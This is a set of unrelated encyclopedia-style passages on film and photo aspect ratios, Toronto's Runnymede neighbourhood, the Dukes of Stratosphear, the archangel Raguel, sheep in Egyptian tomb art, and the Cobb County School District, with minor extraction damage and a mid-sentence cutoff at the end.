matte, altering the aspect ratio to the television standard of 1.33:1. Because of the varied ways in which films are shot, IAR (Intended Aspect Ratio) is a more appropriate term, but is rarely used. = Modified aspect ratio (MAR) = Modified Aspect Ratio is a home cinema term for the aspect ratio or dimensions in which a film was modified to fit a specific type of screen, as opposed to original aspect ratio. Modified aspect ratios are usually either 1.:1 (historically), or (with the advent of widescreen television sets) 1.:1 aspect ratio. 1.:1 is the modified aspect ratio used historically in VHS format. A modified aspect ratio transfer is achieved by means of pan and scan or EAR (Expanded Aspect Ratio)/open matte, the latter meaning removing the cinematic matte from a 1.85:1 film to open up the full 1.33:1 frame or from 2.39:1 to 1.90:1 in IMAX. Another name for it is \\"prescaled\\" aspect ratio\\".  Problems in film and television  windowboxed image Multiple aspect ratios create additional burdens on directors and the public, and confusion among TV broadcasters. It is common for a widescreen film to be presented in an altered format (cropped, letterboxed or expanded beyond the original aspect ratio). It is also not uncommon for windowboxing to occur (when letterbox and pillarbox happen simultaneously). For instance, a 16:9 broadcast could embed a 4:3 commercial within the 16:9 image area. A viewer watching on a standard 4:3 (non-widescreen) television would see a 4:3 image of the commercial with 2 sets of black stripes, vertical and horizontal (windowboxing or the postage stamp effect). A similar scenario may also occur for a widescreen set owner when viewing 16:9 material embedded in a 4:3 frame, and then watching that in 16:9. Active Format Description is a mechanism used in digital broadcasting to avoid this problem. It is also common that a 4:3 image is stretched horizontally to fit a 16:9 screen to avoid pillar boxing but distorts the image so subjects appear short and fat. Both PAL and NTSC have provision for some data pulses contained within the video signal used to signal the aspect ratio (See ITU-R BT.1119-1 ‚Äì Widescreen signaling for broadcasting). These pulses are detected by television sets that have widescreen displays and cause the television to automatically switch to 16:9 display mode. When 4:3 material is included (such as the aforementioned commercial), the television switches to a 4:3 display mode to correctly display the material. Where a video signal is transmitted via a European SCART connection, one of the status lines is used to signal 16:9 material as well.  Still photography  Common aspect ratios in still photography include: * 1:1 * 5:4 (1.25:1) * 4:3 (1.:1) * 3:2 (1.5:1) * 5:3 (1.:1) * 16:9 (1.:1) * 3:1 Many digital still cameras offer user options for selecting multiple image aspect ratios. Some achieve this through the use of multi-aspect sensors (notably Panasonic), while others simply crop their native image format to have the output match the desired image aspect ratio. = 1:1 = 1:1 is the classic Kodak image, and is available as a choice in some digital still cameras, and hearkens back to the days of film cameras when the square image was popular with photographers using twin lens reflex cameras. These medium format cameras used 120 film rolled onto spools. The 6 √ó 6 cm image size was the classic 1:1 format in the recent past. 120 film can still be found and used today. Many Polaroid instant films were designed as square formats. Furthermore, up until August 2015, photo-sharing site Instagram only allowed users to upload images in 1:1 format. In 2017, Fujifilm added the 1:1 Instax Square format to their lineup of instant film cameras. = 5:4 = Common in large and medium format photography, and still in common use for prints from digital cameras in the 8\\"√ó10\\" size. = 4:3 = 4:3 is used by most digital point-and-shoot cameras, Four Thirds system, Micro Four Thirds system cameras and medium format 645 cameras. The 4:3 digital format popularity was developed to match the then prevailing digital displays of the time, 4:3 computer monitors. The next several formats have their roots in classic film photography image sizes, both the classic 35 mm film camera, and the multiple format Advanced Photo System (APS) film camera. The APS camera was capable of selecting any of three image formats, APS-H (\\"High Definition\\" mode), APS-C (\\"Classic\\" mode) and APS-P (\\"Panoramic\\" mode). = 3:2 = 3:2 is used by classic 35 mm film cameras using a 36 mm √ó 24 mm image size, and their digital derivatives represented by DSLRs. Typical DSLRs come in two flavors, the so-called professional \\"full frame\\" (36 mm √ó 24 mm) sensors and variations of smaller, so called \\"APS-C\\" sensors. The term \\"APS\\" is derived from another film format known as APS and the \\"-C\\" refers to \\"Classic\\" mode, which exposed images over a smaller area (25.1 mm √ó 16.7 mm) but retaining the same \\"classic\\" 3:2 proportions as full frame 35 mm film cameras. When discussing DSLR's and their non-SLR derivatives, the term APS-C has become an almost generic term. The two major camera manufacturers Canon and Nikon each developed and established sensor standards for their own versions of APS-C sized and proportioned sensors. Canon actually developed two standards, APS-C and a slightly larger area APS-H (not to be confused with the APS-H film format), while Nikon developed its own APS-C standard, which it calls DX. Regardless of the different flavors of sensors, and their varying sizes, they are close enough to the original APS-C image size, and maintain the classic 3:2 image proportions that these sensors are generally known as an \\"APS-C\\" sized sensor. The reason for DSLR's image sensors being the flatter 3:2 versus the taller point-and-shoot 4:3 is that DSLRs were designed to match the legacy 35 mm SLR film, whereas the majority of digital cameras were designed to match the predominant computer displays of the time, with VGA, SVGA, XGA and UXGA all being 4:3. Widescreen computer monitors did not become popular until the advent of HDTV, which uses a 16:9 image aspect ratio. = 16:9 = 16:9 is another format that has its roots in the APS film camera. Known as APS-H (30.2 mm √ó 16.7 mm), with the \\"-H\\" denoting \\"High Definition\\", the 16:9 format is also the standard image aspect ratio for HDTV. 16:9 is gaining popularity as a format in all classes of consumer still cameras which also shoot High Definition (HD) video. When still cameras have an HD video capability, some can also record stills in the 16:9 format, ideal for display on HD televisions and widescreen computer displays. = 3:1 = 3:1 is yet another format that can find its roots in the APS film camera. Known as APS-P (30.2 √ó 9.5 mm), with the -P\\" denoting \\"Panorama\\", the 3:1 format was used for panorama photography. The APS-P panorama standard is the least adhered to any APS standard, and panoramic implementation varies with by manufacturer on different cameras, with the only commonality being that the image is much longer than it is tall, in the classic \\"panorama\\" style. Common print sizes in the U.S. (in inches) include 4√ó6 (1.5), 5√ó7 (1.4), 4√ó5 and 8√ó10 (1.25), and 11√ó14 (1.27); large format cameras typically use one of these aspect ratios. Medium-format cameras typically have format designated by nominal sizes in centimeters (6√ó6, 6√ó7, 6√ó9, 6√ó4.5), but these numbers should not be interpreted as exact in computing aspect ratios. For example, the usable height of 120-format roll film is 56mm, so a width of 70mm (as in 6√ó7) yields an aspect ratio of 4:5 ‚Äî ideal for enlarging to make an 8√ó10\\" portrait. Print sizes are usually defined by their portrait dimensions (tall) while equipment aspect ratios are defined by their landscape dimensions (wide, flipped sideways). A good example of this a 4√ó6 print (6 inch wide by 4 inch tall landscape) perfectly matches the 3:2 aspect ratio of a DSLR/35 mm, since 6/2=3 and 4/2=2. For analog projection of photographic slides, projector and screen use a 1:1 aspect ratio, supporting horizontal and vertical orientation equally well. In contrast, digital projection technology typically supports vertically oriented images only at a fraction of the resolution of landscape-oriented images. For example, projecting a digital still image having a 3:2 aspect ratio on a 16:9 projector employs 84.3% of available resolution in horizontal orientation, but only 37.5% in vertical orientation.

It is located directly north of the former village of Swansea and west of the High Park North neighbourhood. The immediate area around Bloor Street is commonly known as Bloor West Village after the shopping area along Bloor Street, whereas the area to the north is considered the Runnymede neighbourhood. Character Houses in Runnymede are generally two story brick houses. Houses in this neighbourhood are generally (often American craftsman style) two story brick houses, however renovations are becoming popular and many of the traditional homes are being torn down to create larger, more modern homes. The tree-lined streets in this area, which was annexed by the city of Toronto in 1909 make this a popular residential neighbourhood. Much of its development was originally due to the creation of a streetcar line along Bloor Street, which the TTC later replaced by the Bloor-Danforth subway line, built in the 1960s. In the Toronto Official Plan, Runnymede is predominantly designated as a neighbourhood. In addition to housing, this classification allows for uses which meet resident needs such as schools, small shops, parks, etc. Great care is taken to ensure the character of Toronto neighbourhoods is preserved, thus the addition of high-rise apartments is not permitted, and new businesses in the community must prove that they will not produce adverse effects to residents, such as noise pollution or increased traffic. They must also fit well with existing businesses, and reduce frequency of automobile use in the neighbourhood (i.e. by providing a needed service within walking distance). History The name Runnymede originates with the estate of John Scarlett, an early land owner in the area. Scarlett owned land in the area as early as 1817. He gave the name Runnymede to his house on Dundas Street. In 1856, Scarlett's holdings bounded by Jane, St. Clair, Clendenan and Annette were purchased by Marcus Rossin, who sub-divided the lands as the \\"Runnymede Estate\\". The sub-division was vacant until 1878. Chapters' move into the former Runnymede Theatre in the late 1990s was controversial with the local residents. The neighourhood's first residents were largely Irish and Anglo- Saxon, followed eventually by immigrants of Eastern European origin. The neighbourhood has a history of opposing large scale redevelopment. In 1966, Romark Developments proposed the construction of a giant apartment complex at Bloor and Jane streets. The plan proposed the construction of 15 apartment buildings (one as high as 38 storeys), shopping centres and open space. The project was estimated to cost $60 million to construct. It would have ranged from Bloor and Jane Street east to Runnymede Road and north to Colbeck Street. Over 1,000 ratepayers came out at a public meeting on March 7, 1966 at Runnymede School to oppose the project. A great furor accompanied the arrival of a Chapters bookstore at the Runnymede Theatre in the late 1990s. Aside from discontent about the effect of a large bookstore undermining older local businesses, many residents were upset that the local historic movie theatre was going to be gutted to make room for the new store. However, the arrival of Chapters allowed restoration of the historical Runnymede Theatre. At the time, Chapters was the only company willing to make the $5 million investment necessary to restore the building. The movie theatre closed in February 1999. Culture The neighbourhood has two Toronto Public Library locations, Runnymede and Annette, and there is a nearby location in Swansea. The BIA hosts: *Annual Ukrainian Festival in September (music, foods and crafts). * July Festival, which is a local fair of amusements and entertainment. *Halloween Festival on Armadale Avenue, Beresford Avenue and Glendonwynne Road (family-friendly activities). *Participates in the Toronto citywide \\"Cavalcade of Lights\\" (December) = Bloor West Village shopping district = Bloor West Village is a shopping district located along the southern portion of Runnymede. Bloor West Village is a shopping district in Toronto, Ontario, Canada. Bloor West is perceived as a district because the elements and characteristics that make it up make it easily identifiable both from the inside and from the outside. These same characteristics make it stand out and give it a different feel from adjacent areas. Located along Bloor Street, it encompasses all businesses along Bloor Street between Jane Street and Ellis Park Road, consisting of more than 400 shops, restaurants and services. The mix of stores, which include specialty clothing stores, book stores, restaurants and cafes, creates a vibrant, positive space for residents to fulfill basic needs and interact with the rest of the community. The district includes many features which contribute to its lively character. It promotes pedestrian activity through the use of wide sidewalks, benches, tree-lined streets, and frequently used outdoor cafes. This atmosphere makes Bloor St. West the predominant public space in the neighbourhood, and it is full of activity at any given time during the day. Bloor West Village caters mainly to neighbourhood residents, it has a number of small-scale, resident-owned stores which meet needs of community members, but lacks the uniqueness which would generate significant activity from non-residents. Demographic In the 2006 Census of Canada, 10.7% of immigrants identified their place of Origin as the United Kingdom, 11.4% said Polish, and 9.6% said Ukrainian.2006 Census of Canada 18.8% of residents (omitting those whose first language was English or French) identified Ukrainian as their first language. This is the most common non-official language spoken in the neighbourhood. This census estimated the number of residents within the neighbourhood as 9,565. 37% are between the ages of 30 to 49, 26% between the ages of 0 to 19, 11% between the ages of 20-29 and 15% are 60+. From the total population only 13% of the residents do not belong to a census family. This indicates that one of the main characteristics of Bloor West is that it is largely made up of young families. Education Runnymede Collegiate Institute is a secondary school operated by the Toronto District School Board. The Toronto District School Board (TDSB) is an English secular public school board that presently serves the City of Toronto, including the neighbourhood of Runnymede. The school board operates one secondary school in the neighbourhood, Runnymede Collegiate Institute, near the intersection of Dundas and Jane Street. In addition, TDSB also operates several elementary schools in the area. They are: * King George Junior Public School is a public elementary school located on Rexford Road. It first opened in 1911, the year of King George V's coronation, it replaced Elizabeth Street School, built in 1882. The present building opened in 1964. King George houses a Learning Enrichment Before and After School Program for children 6 to 12 years of age. *Runnymede Public School is a public elementary school on Runnymede Road. It has grades JK-8 and has around 1100 students enrolled. The school was founded in 1913 as a one-room schoolhouse. In addition, the city's public English separate school board, Toronto Catholic District School Board (TCDSB), also operates several schools in the neighbourhood. The TCDSB operates one secondary school in Runnymede, Bishop Marrocco/Thomas Merton Catholic Secondary School. In addition, TCDSB also operates two elementary schools. They are: * St Pius X Catholic School, an elementary school located on Jane Street, just north of Bloor Street. The school has a mandatory blue and white dress code. The school's religion program teaches Catholic faith and is integrated closely to St. Pius X Catholic Church. * James Culnan Catholic School, an elementary school located on Willard Avenue and offers Junior Kindergarten to Grade 8 education, with an extended French program starting in Grade 5. The current enrollment is 421 students and the principal is Gianna Helling. The school, named for trustee James Culnan, was opened in 1970 with the official opening and blessing 6 June 1971. Although the main entrance is on Willard Avenue, houses on both it and Windermere Avenue were expropriated to allow for the building of the school. In 1995 the school celebrated its 25th anniversary with a special mass at St. James Church. James Culnan was a trustee for 37 years, until his death in 1964, and was knighted by Pope Pius XII in 1957 in honour of his work with the Metropolitan Separate School Board, today the Toronto Catholic District School Board. The school has a mandatory blue and white dress code. The school's religion program teaches Catholic faith and is integrated closely to St James Parish. In addition to the TCDSB and TDSB, two other public school boards also operate in the City of Toronto. Conseil scolaire Viamonde is a secular French public school board, while the Conseil scolaire de district catholique Centre- Sud is a French separate public school board. However, neither French-language school board operates a school in Runnymede. Transportation TTC bus outside Jane station bus platforms. Jane station is a subway station located at the southwest corner of Runnymede. Two major transportation nodes are defined in the neighbourhood by subway stations at either end of Bloor Street (served by the Bloor-Danforth line), at Jane Street and Runnymede Road. Buses runs north from Jane Station and north and south from Runnymede Stations. Annette Street is served by a bus line from Jane Station. A night bus replaces the subway line during the early morning hours along Bloor Street. Bike Lanes have been incorporated into the neighbourhood as well along Runnymede st. This is something new and adds to the transit modes of the neighbourhood. This is a positive implementation because there has been an increase ‚Äì from 1.75% to 3.13%- in the number of residents that use cycling as a mode of transportation. =Main streets= The major streets are Bloor Street, Jane Street, and Runnymede Road. Bloor Street, the main thoroughfare, is a four- lane major arterial road, lined with mainly commercial and retail, predominately two-storey buildings with a retail first floor and residential on the upper floors. Most businesses are local stores and restaurants and there are some chains of fast-food restaurants.Most businesses found along Bloor are local and in this respect they are unique but they still have to compete with modern chain businesses in the area, such as clothing stores, cafes and grocery stores. In the Official Plan ‚Äìwhich discusses the intended pattern of future growth ‚Äì Bloor Street has been identified as an area for potential intensification which will turn this street into an avenue. In order to allow for this density intensification, zoning amendments are to take place. For instance the maximum height for buildings in the area is 5 stories, however along Bloor, they are allowing for a maximum height of 8 stories. View of Runnymede from the intersection of Annette and Jane Street. Jane Street serves as Runnymede's eastern boundary. The businesses are organized into the Bloor-West Village Business Improvement Association. The Runnymede Library is also located on Bloor. Jane Street, which is a four-lane major arterial road running north from Bloor, changes along its length within the neighbourhood, being predominantly commercial and retail around Bloor Street and Annette. Annette, in the northern part of the neighbourhood, is a four-lane minor arterial road, which runs east-west and is predominantly residential with some schools and the Annette Library located along the street. Bloor Street and Jane Street, as the main streets in the neighbourhood, serve as both edges that separate BWV from adjacent neighourhoods and as paths to connect people from one place to another. Any activity or social interaction only really occurs along Bloor Street, part of the reason is because it has many points of interests along the way. The fact that the sidewalks are quite lengthy also contributes to this activity. However, the opposite is true for the minor roads; they serve strictly as pathways, not as a place to interact. Runnymede Road, which runs north-south, is also classified as a minor arterial road with predominantly residential land use, and includes Runnymede Junior and Senior Public School, as well as Runnymede United Church. The land use becomes more mixed approaching Annette St. and Dundas St. W. Dundas is another major arterial in the neighbourhood, but it is not as dominant as the other four. While Bloor St. West is always full of life, local roads within the neighbourhood are very quiet. For the most part, these roads are used simply as pathways to get out of the neighbourhood, and not as public space where people choose to spend time, as is the case with Bloor. As the inner neighbourhood consists almost entirely of housing, rather than a mix of businesses, the streets are relatively quiet. This is an advantage to the many residents who have young children. In Toronto‚Äôs zoning maps, which designate the permitted land uses in a given area, the arterial roads making up the borders of the neighbourhood (Jane, Runnymede, and Bloor) are zoned as mixed use. The local roads within are predominantly residential, with the exception of Annette (a minor arterial road).http://www.toronto.ca/legdocs/bylaws/2010/law1156-Schedule-A/law1156-zoning- west-maps09.pdf This creates clearly identifiable boundaries around the neighbourhood. The creation of such a hard edge may discourage residents from interacting with adjacent neighbourhoods.

Modeled after psychedelic pop groups from the 1960s, the Dukes were initially publicised by Virgin Records as a mysterious new act, but were actually an XTC spin-off band. They recorded only two albums: 25 O'Clock (1985) and Psonic Psunspot (1987). In the UK, the records outsold XTC's then-current albums The Big Express (1984) and Skylarking (1986). Partridge envisioned the Dukes as an amalgamation of \\"your favourite bands from 1967.\\" He and Dave Gregory conceived the project in 1979, but it was not until December 1984 that the band found the opportunity to spend a few days recording what would become 25 O'Clock. Three rules were set for its production: songs must follow the conventions of 1967 and 1968 psychedelia, no more than two takes allowed, and use vintage equipment wherever possible. After reuniting for the LP Psonic Psunspot, XTC told interviewers that the group were killed in a \\"horrible sherbet accident\\". Several sequels were proposed but ultimately abandoned, including the mock rock opera The Great Royal Jelly Scandal, a prequel album featuring the Dukes in their early Merseybeat phase, and a glitter rock parody as \\"The Stratosphear Gang\\". In 1993, Partridge conceived a spiritual successor to the Dukes in the form of a \\"heavily sexual\\" bubblegum LP. Virgin rejected the album, leading XTC to go on strike against the label for several years. Some of its songs were later reworked and released on subsequent XTC albums and compilations. The Dukes of Stratosphear anticipated and were celebrated by retro-minded movements such as the Paisley Underground. In 2003, they reunited again to record one song commissioned by the MS Society, and in 2008, Partridge recorded two tracks credited to \\"the Dukes\\" as part of a commission for Eurostar. These songs were included as bonuses on later reissues of the Dukes albums. Origins and early influences As a teenager listening to psychedelic records, XTC leader Andy Partridge was particularly fond of Pink Floyd's \\"See Emily Play\\" (1967), Tomorrow's \\"My White Bicycle\\" (1967), and the Moles' \\"We Are the Moles\\" (1968). Partridge viewed psychedelic music as a \\"grown-up\\" version of children's novelty records, believing that many acts were trying to emulate those records that they grew up with: \\"They use exactly the same techniques‚Äîsped-up bits, slowed-down bits, too much echo, too much reverb, that bit goes backwards. ... There was no transition to be made. You go from things like 'Flying Purple People Eater' to 'I Am the Walrus'. They go hand-in-hand.\\" He also held a preference for British psychedelia rather than its American variant: \\"In the States, it was all about reaction to the Vietnam War. The music was dark and brooding, filled with angry distortion.\\" In 1975, he considered renaming his fledgling band the Helium Kidz to \\"the Dukes of Stratosphear\\", but he thought \\"it was too flowery and people would think we were a psychedelic group. ... We needed a fast inventive name.\\" XTC performing live (pictured from left: Gregory and Partridge) When guitarist Dave Gregory was invited to join XTC in 1979, Partridge learned that they both shared a longtime passion for 1960s psychedelic music. An album of songs in that style was immediately put to consideration, but the group could not go through with it due to their commercial obligations to Virgin Records. \\"We talked about it a lot, but he wasn't even in the band at the time, and really, to be honest, I didn't have any spare time at all. I was constantly touring.\\" Another consideration Partridge had was the punk movement's antipathy toward pop music of the past: \\"A real Pol Pot kind of thing, which is ludicrous, and rather nasty.\\" At a Mummer session in 1982, he remembered saying to producer Steve Nye During the making of XTC's 1984 album The Big Express, Partridge began writing material he thought could potentially be performed in a psychedelic style, the first being \\"Your Gold Dress\\". He recalled \\"sneak[ing] off upstairs in Crescent Studios, in Bath, with my cassette machine and whisper these ideas for psychedelic songs into it. I was beginning not be able to contain the desire to do this. You can see it leaking out earlier ... 'Let's get a Mellotron! Let's put some backwards so-and-so on here.'\\" 1984‚Äì1987 =25 O'Clock= In November 1984, one month after the release of The Big Express, Partridge traveled to Monmouth, Wales with engineer John Leckie to produce the album Miss America by singer-songwriter Mary Margaret O'Hara, who had recently signed with Virgin. Partridge and Leckie were dismissed due to conflicts related to their religious affiliations or lack thereof (O'Hara was a devout Catholic). Partridge was feeling inspired by Nick Nicely's 1982 psychedelic single \\"Hilly Fields 1892\\", and devised a recording project to fill the newfound gap in his schedule. The rules were as follows: songs must follow the conventions of 1967 and 1968 psychedelia; no more than two takes allowed; use vintage equipment wherever possible. Partridge said: \\"I didn't really have songs ready, just ideas. I knew I wanted to do something like Syd Barrett. Perhaps a Beatles-esque track. ... I rung up the other guys and said 'Hey, let's put on a show!'; you know, that kind of thing.\\" Leckie agreed to take on production and searched for a cheap studio for the band. Partridge invited his XTC bandmates to participate; they were augmented on drums by Dave's brother Ian, since the group did not have a drummer at the time. The label, although skeptical, loaned the group ¬£5,000, and two weeks were spent on the album's recording and mixing at Chapel Lane Studios in Hereford, England. The project was planned as a full-length LP, but only six songs could be recorded due to time constraints. Partridge looked back on its making as the \\"most fun we ever had in the studio.\\" Each musician adopted a pseudonym: \\"Sir John Johns\\" (Partridge) \\"Lord Cornelius Plum\\" (Dave), \\"The Red Curtain\\" (Colin Moulding) and \\"E.I.E.I. Owen\\" (Ian). Partridge's moniker came from a 1967 DC Comics martian character, while Moulding's was derived from an old nickname referring to the length of his hair. The band dressed themselves in Paisley outfits for the sessions and lit scented candles.\\" Released exclusively in Britain on April Fool's Day 1985, the mini-album 25 O'Clock was presented as a long-lost collection of recordings by a late 1960s group. Virgin Records publicised the Dukes as a mysterious new act, and when asked about the album in interviews, XTC initially denied having any involvement. A music video set to \\"The Mole from the Ministry\\"‚Äîthe first in which they were allowed total creative input‚Äîwas produced for BBC West's RPM music programme. Partridge: \\"That's the only one of our videos that I've liked, the only one I can watch ... every little [promo] film [from 1967] we could find, we put ideas from them in there.\\" In England, 25 O'Clock sold twice as many copies as The Big Express, even before the Dukes' identity was made public. The album also achieved considerable sales in the US. On XTC's next album Skylarking (1986), the Dukes were mentioned in its liner notes, where they were thanked for the loan of their guitars. =Psonic Psunspot= Partridge was reluctant to make another Dukes album, but to appease requests from his bandmates and Virgin Records, Psonic Psunspot (August 1987) was recorded. He later admitted that \\"secretly I was thinking, 'Oh god, I wish they ask for a second one, because I'd love to do another one!'\\" This time, a ¬£10,000 budget was supplied, while John Leckie returned as producer. It was recorded in a different studio with more modern equipment. Partridge said: \\"I think we strayed a little from the truism of old gear and old stuff. It still sounds reasonably in the ballpark.\\" Originally, the running order was supposed to begin with \\"You're My Drug\\" and end with \\"Collideascope\\", but Virgin suggested flipping the sides so that \\"Vanishing Girl\\" would be the opening track. After the album's release, it was reported that when Brian Wilson was played its Beach Boys pastiche \\"Pale and Precious\\", he thought it was styled after Paul McCartney. Once again, the Dukes' record outsold XTC's previous album in the UK (Skylarking in this case). Partridge: \\"That was a bit upsetting to think that people preferred these pretend personalities to our own personalities‚Ä¶ they‚Äôre trying to tell us something. But I don‚Äôt mind because we have turned into the Dukes slowly over the years.\\" Moulding likewise felt that the \\"psychedelic element was being more ingratiated into the pie\\" since 25 O'Clock. When issued on CD, Psonic Psunspot was combined with 25 O'Clock and given the title Chips from the Chocolate Fireball (1987). Acts such as Kula Shaker, the Shamen and the Stone Roses would later recruit Leckie based on his production work for the Dukes. Later years and related projects After Psonic Psunspot, the group told interviewers that the Dukes were killed in a \\"horrible sherbet accident\\". Gregory felt \\"I could carry on making Dukes albums for the rest of my career, but there's only so many laughs you can get out of one joke!\\" Partridge also did not feel that the Dukes could be taken any further. \\"We [only] did the [Dukes] as a joke and as a thank you to all of the bands that made our school days colorful.\\" In 1991, he produced two tracks, \\"It's Snowing Angels\\" and \\"Then She Appeared\\", intended to be released as a hoax flexidisc attached to the cover of Strange Things Are Happening magazine. The magazine folded before the single could be pressed. \\"Then She Appeared\\" would be reworked for XTC's Nonsuch (1992), while \\"It's Snowing Angels\\" was released in 1994 via John Flansburgh's Hello Recording Club. Both tracks were included on Partridge's 2002 compilation Fuzzy Warbles Volume 2. Several sequels were proposed but ultimately abandoned, including the mock rock opera The Great Royal Jelly Scandal, an animated feature film of 25 O'Clock, a prequel album featuring the Dukes in their early Merseybeat phase, and a glitter rock parody as \\"The Stratosphear Gang\\" (the last of which Partridge suggested might have comprised songs originally written for the Helium Kidz). In 1993, Partridge conceived a spiritual successor to the Dukes in the form of a \\"bubblegum\\" album. The LP would have disguised itself as a retrospective compilation featuring 12 different groups from the early 1970s. \\"And all of the lyrics were heavily sexual. There was a song called \\"Lolly (Suck It and See),' and there was another one called \\"Visit to the Doctor,' which was vaguely molesting.\\" He recalled playing some demos for Virgin, whose \\"jaws just hung open like that scene in [the 1967 film] The Producers when people see Springtime for Hitler the first time. There was a horrible silence for what seemed like an hour. And the project didn't get done\\". Several of its tracks were reworked and released on various XTC albums and compilations. \\"Standing in for Joe\\" from Wasp Star (Apple Venus Volume 2) was one such instance. The four members reformed only once, in 2003, to record the track \\"Open a Can (Of Human Beans)\\" for the MS Society charity compilation album The Wish List. In 2008, Partridge recorded \\"Tin Toy Clockwork Train\\", a solo promotional single for Eurostar credited to the Dukes, which was given away free at railway stations. In April 2009, both Dukes records were released on CD for the first time in their own right, along with demo recordings, bonus tracks and brand new sleeve notes from the band.

He is considered the Angel of Justice. His name means \\"Friend of God\\". Raguel is almost always referred to as the archangel of justice, fairness, harmony, vengeance and redemption. He is also sometimes known as the archangel of speech. In the Book of Enoch, cap. XXIII, Raguel is one of the seven angels whose role is to watch. His number is 6, and his function is to take vengeance on the world of the luminaries who have transgressed God's laws.http://www.sacred-texts.com/bib/boe/boe026.htm Raguel's duties have remained the same across Jewish and Christian traditions. Much like a sheriff or constable, Raguel's purpose has always been to keep fallen angels and demons in check, delivering heinous judgment upon any that over-step their boundaries. He has been known to destroy wicked spirits, and cast fallen angels into Hell (called Gehenna in the Hebrew Old Testament and called Tartarus in the Greek New Testament). Raguel is not mentioned in the canonical writings of the Bible. However, in 2 Enoch, which is generally considered non-canonical, the patriarch Enoch was carried as a mortal to and from Heaven by the angels Raguel and Sariel. Possible historical references to a similar figure from other cultures can be found in Babylonian culture as \\"Rag\\" (some translations say Ragumu), and in Sumerian as \\"Rig\\" which means to talk or speech.

The ovacaprines were domesticated and often depicted on the stone tomb murals of the pharaohs for religious or aesthetic purposes. Ovis longipes palaeo-aegyptiacus was one of the two most commonly domesticated sheep utilized on the reliefs of early pharaonic tombs mostly because of its unique loosely spiraling horns which came out of the sides of the skull. A similar form of the sheep called Ovis platyura aegyptiaca had horns that developed downward and curled forward. Later on, these two variants of sheep came to presume important religious significance as well as domestic use. Herodotus recounts that early Egyptians did not wear wool, but some scholars argue that it was meant only for the priests and that there is archaeological evidence, including the body of a man wrapped in wool dating to the First Dynasty in a burial at al-Helwan, that delineates this point. The use of this sheep is also unique in Egyptian depiction of their early deities.

The school district includes all of Cobb County except for the Marietta City Schools, though a number of schools in unincorporated parts of the county have Marietta addresses. It is the second-largest school system in Georgia (behind only Gwinnett County Public Schools) and among the largest in the United States, with a 2014 enrollment of 111,751. It has 13,371 employees, 7,103 of whom are teachers. The district is the county's largest employerhttp://economic.cobbcountyga.gov/top-25.htm and one of the largest in the US (at least in school systems). All Cobb County schools are accredited by the Southern Association of Colleges and Schools (SACS), and the district is among the first to have earned district-wide accreditation. Board of Education As a body created under provisions of the Georgia's constitution, the Cobb County Board of Education has full authority to control and manage the public schools within the county, excluding any independent school system now in existence within the county. This means that like other school systems in the state, it is directly under the Georgia Department of Education and not subject to city or county government control. This also means that it has separate funding through its own property tax (except on senior citizens) outside of Marietta city limits, and 1% county-wide sales tax which it splits with Marietta City Schools based on which jurisdiction it was collected in.

Despite being built outside the 100-year flood plain, water rose ankle-deep on the grounds as the children were being evacuated. The school housed about 450 students. For three school years, these students attended Compton Elementary (K-2) and Austell Intermediate (3-5). The new Clarkdale Elementary opened in mid-August 2012 near Cooper Middle School (although the Federal Emergency Management Agency declared the original site acceptablehttp://mdjonline.com/bookmark/6175150), while the previous building awaited demolition, a delay which the local neighborhood complained about. State funding (a bond for 20% of the cost of replacement) was vetoed by Governor Sonny Perdue on procedural grounds in early June 2010.http://mdjonline.com/bookmark/7840966 Most of the remainder will be covered by insurance and leftover SPLOST funds.http://www.publicschoolreview.com/news_archive/school_id/20605 At least one other school has been demolished. The original Blackwell Elementary School in the Blackwells community was built in the 1920s on Canton Road (old Georgia 5), as the county's first consolidated school. The historic schoolhouse, and all of its later additions, were destroyed in summer 1997 and closed for a year while a new replacement was built on the same site, in an institutional style much like the plain architecture of an office park rather than a historic school. The original Mountain View Elementary was rebuilt further down Sandy Plains Road, the original was demolished in 2018 for a new shopping center having a Publix GreenWise Market (similar to Sprouts and Whole Foods) as its anchor store. Also located in a busy business district, Brumby Elementary on Powers Ferry Road will be replaced by a mixed-use development in 2020 with a Kroger superstore by 2022. Both Brumby and East Cobb Middle School opened new schools next to each other on Terrell Mill Road in August 2018, although local residents objected to the expected traffic and noise. The old East Cobb MS, located directly across Holt Road from Wheeler HS, will be home to a relocated Eastvalley ES. Controversies =Power to Learn laptop initiative= In 2005, the district implemented a technology initiative called Power to Learn, which supplies individual laptop computers to students for use in the classroom. The initiative was to be initially funded by a portion of the special-purpose local-option sales tax (SPLOST) funds approved by Cobb voters in the 2003 referendum and earmarked for technology improvements. The first of three proposed phases of the initiative was approved by the Board of Education in April 2005, authorizing purchase of Apple laptops for all teachers, upgrades of middle school business labs, and the establishment of four high school pilot sites to test and evaluate individual student laptop use. Former county commissioner Joseph \\"Butch\\" Thompson filed a lawsuit against the Board of Education on May 31, 2005. The lawsuit charged that Cobb voters did not specifically authorize the program in the 2003 SPLOST vote. On July 29, 2005, Superior Court Judge S. Lark Ingram mandated the Board of Education to use technology funds as specified in SPLOST II and ordered a permanent injunction to halt the Power to Learn initiative. The Atlanta Journal-Constitution quoted Ingram, \\"The ruling had nothing to do with the merits of the program. But fair notice of such use was not given to the public when the referendum for [the sales tax] was held.\\" Board chair Kathleen Johnstone announced on August 1 that the laptop program \\"was no longer an option.\\" The board voted on August 25, 2005, to appeal the ruling, which was thrown out by the Georgia Supreme Court. Superintendent Redden's resignation The Board of Education hired New York-based auditing firm Kessler International in July 2005 to investigate the bidding process for the initiative, amid allegations that the bidding process which selected Apple Computer as supplier for the initiative had violated state law. The board received the Kessler report on August 14, 2005. The report indicated flaws in the selection process that were not in line with state procurement policies. Superintendent Gen. Joseph Redden offered a page-by-page rebuttal of the audit report to the board on August 17, 2005. Redden announced his resignation on August 24, 2005. Grand jury investigation Upon the request of the Board of Education, Cobb District Attorney Pat Head was granted an order on October 6, 2005 to empanel a special grand jury to investigate the bidding process. On April 19, 2007, the 25-member grand jury released its report and suggested no criminal charges be filed. The report was critical of the school district's procurement processes, and suggested that the district provide greater definition and clarity to its purchasing procedures. The release of the grand jury report concluded the laptop initiative saga. The school district began refreshing outdated computer systems throughout the county in early 2007, precisely as outlined in SPLOST II. =Selman v. Cobb County School District= In 2005, Cobb County School District voted to put stickers on textbooks with a message including the admonition cautioning students that \\"evolution is only a theory.\\" Plaintiffs brought suit on separation of church and state grounds, with the initial trial finding for the plaintiffs. Cobb County School District appealed and the verdict was overturned and remanded for a new trial, at which time plaintiffs and Cobb County School District reached an out-of-court settlement, with the district agreeing to remove the stickers. =Teacher's sexual contact with student= A Cobb County teacher was discovered to have had sex with a 17-year-old student. When brought to trial, the teacher pled that the student had consented. This defense 